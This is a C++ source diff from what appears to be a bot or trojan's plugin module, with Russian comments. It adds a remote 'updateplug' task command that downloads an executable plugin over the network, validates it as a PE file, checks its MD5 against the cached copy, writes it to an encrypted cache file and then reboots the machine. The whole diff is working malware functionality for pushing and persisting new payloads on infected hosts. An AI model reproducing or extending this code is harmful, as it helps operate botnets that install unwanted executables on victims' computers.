@@ -6,6 +6,8 @@
 #include "BotHTTP.h"
 #include "Plugins.h"
 #include "HTTPConsts.h"
+#include "Task.h"
+#include "md5.h"
 
 //---------------------------------------------------------------------------
 
@@ -735,3 +737,86 @@ LPBYTE Plugin::DownloadFromCache(PCHAR PluginName, bool IsExecutable,  PCHAR Cac
     return Buf;
 }
 //---------------------------------------------------------------------------
+const char* Plugin::CommandUpdatePlug = "updateplug";
+
+void CalcMd5SummForBuffer(const void* data, DWORD size, BYTE summ[16])
+{
+	MD5_CTX ctx;	
+
+	MD5Init(&ctx);
+	MD5Update( &ctx, (unsigned char*)data, size );
+
+	MD5Final(summ, &ctx);
+}
+
+bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
+{
+	PDBG("Plugins", "ExecuteUpdatePlug: '%s'", Args);
+	
+	PCHAR  PlugName = Args;
+
+	DWORD  CachedFileSize = 0;
+	LPBYTE CachedFile = DownloadFromCache(PlugName, true, NULL, &CachedFileSize);
+	PDBG("Plugins", "ExecuteUpdatePlug: DownloadFromCache() return body=0x%X size=%d", CachedFile, 
+		CachedFileSize);
+
+	DWORD  NetworkFileSize = 0;
+	LPBYTE NetworkFile = DownloadEx(PlugName, NULL, &NetworkFileSize, true, false, NULL);
+	PDBG("Plugins", "ExecuteUpdatePlug: Download() return body=0x%X size=%d", NetworkFile, 
+		NetworkFileSize);
+
+	PCHAR CacheFileName = PLGCACHE::GetPluginCacheFileName(NULL, PlugName);
+
+	do
+	{
+		PDBG("Plugins", "ExecuteUpdatePlug: check is file loaded from network");
+		// Проверяем загрузился ли плаг
+		if (NetworkFile == NULL) break;
+
+		// Проверяем формат (PE)
+		PDBG("Plugins", "ExecuteUpdatePlug: check file from network for PE");
+		if (!IsExecutableFile(NetworkFile)) break;
+
+		// Сверяем md5 суммы
+		PDBG("Plugins", "ExecuteUpdatePlug: compare md5 summs");
+		if (CachedFile != NULL)
+		{
+			BYTE sumCached[16];
+			BYTE sumNetwork[16];
+
+			m_memset(sumCached, 0, 16);
+			m_memset(sumNetwork, 0, 16);
+
+			CalcMd5SummForBuffer(CachedFile, CachedFileSize, sumCached);
+			CalcMd5SummForBuffer(NetworkFile, NetworkFileSize, sumNetwork);
+
+			int sumCompareResult = m_memcmp(sumCached, sumNetwork, 16);
+			PDBG("Plugins", "ExecuteUpdatePlug: sumCompareResult=%d", sumCompareResult);
+
+			// Если сумма одинакова - ничего не делаем.
+			if (sumCompareResult == 0) break;
+		}
+		
+		// Проверяем получилось ли получить файла для кеша.
+		if (CacheFileName == NULL) break;
+		
+		DWORD written = CryptFile::WriteFromBuffer(CacheFileName, NetworkFile, NetworkFileSize, NULL);
+		PDBG("Plugins", "ExecuteUpdatePlug: CryptFile::WriteFromBuffer() return %d", written);
+
+		// Не получилось записать.
+		if (written == 0) break;
+
+		PDBG("Plugins", "ExecuteUpdatePlug: start machine reboot.");
+		Reboot();
+
+		return true;
+	}
+	while (0);
+
+
+	if (CachedFile) MemFree(CachedFile);
+	if (NetworkFile) MemFree(NetworkFile);
+	if (CacheFileName) STR::Free(CacheFileName);
+
+	return false;
+}
